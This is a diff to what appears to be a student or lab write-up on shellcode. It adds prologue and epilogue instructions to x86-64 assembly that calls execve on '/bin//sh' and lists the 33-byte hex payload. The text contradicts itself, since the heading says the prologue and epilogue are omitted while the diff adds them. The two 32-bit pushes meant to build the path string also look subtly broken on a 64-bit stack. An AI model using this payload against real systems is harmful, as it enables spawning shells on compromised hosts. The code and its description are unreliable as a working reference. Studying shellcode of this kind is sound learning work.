@@ -2,6 +2,8 @@
 ## Code Block
 The assembly instructions for my shellcode (minus the header, function prologue/epilogue for brevity):
 ```
+push %rbp
+mov %rsp, %rbp
 xor %rax, %rax
 push %rax
 push $0x68732f2f
@@ -11,6 +13,8 @@ xor %rsi, %rsi
 xor %rdx, %rdx
 mov $0x3b, %al
 syscall
+leave
+ret
 ```
 My shellcode was 33 bytes long, and the hex representation is:
 `55 48 89 e5 48 31 c0 50 68 2f 2f 73 68 68 2f 62 69 6e 48 89 e7 48 31 f6 48 31 d2 b0 3b 0f 05 c9 c3`
